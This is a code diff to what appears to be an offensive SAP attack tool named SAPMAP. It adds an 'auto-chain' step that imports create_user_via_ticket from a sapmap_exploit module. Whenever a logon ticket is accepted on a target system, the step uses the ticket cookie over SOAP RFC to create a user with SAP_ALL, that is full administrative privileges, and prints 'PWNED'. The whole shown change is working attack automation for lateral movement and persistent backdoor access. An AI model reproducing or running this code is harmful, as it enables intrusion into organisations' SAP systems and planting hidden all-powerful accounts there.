@@ -6750,6 +6750,43 @@ def create_app(api: SAPMAPApi) -> Bottle:
                 print(f"      [{mark}] {target_sid:6s} {ch:6s} {ev}")
                 if prop["success"]:
                     succeeded += 1
+                    # Auto-chain: create SAPMAP00 on the target via
+                    # the validated ticket (SOAP RFC over HTTP).
+                    try:
+                        from sapmap_exploit import (
+                            create_user_via_ticket)
+                        http_port = 0
+                        # Use the same port that just worked
+                        for att in prop.get("attempts", []):
+                            if att.get("success") and att.get("port"):
+                                http_port = int(att["port"])
+                                break
+                        use_https = True
+                        for att in prop.get("attempts", []):
+                            if att.get("success"):
+                                use_https = bool(
+                                    att.get("use_https", True))
+                                break
+                        print(f"[*] {target_sid}: auto-chain → "
+                              f"creating SAPMAP user via validated "
+                              f"ticket cookie")
+                        cu_r = create_user_via_ticket(
+                            target_node=target_node,
+                            state=api.state, ticket=ticket,
+                            target_client=target_client,
+                            http_port=http_port,
+                            use_https=use_https, timeout=timeout)
+                        if cu_r["success"]:
+                            print(f"[+] {target_sid}: PWNED — "
+                                  f"{cu_r['username']}/"
+                                  f"{cu_r['client']} created with "
+                                  f"SAP_ALL")
+                        else:
+                            print(f"[!] {target_sid}: user creation "
+                                  f"failed: {cu_r.get('error', '?')}")
+                    except Exception as e:
+                        print(f"[!] {target_sid}: auto user creation "
+                              f"hit exception: {e}")
                 else:
                     # Diagnostic hints for common rejection modes
                     err_lower = ev.lower()
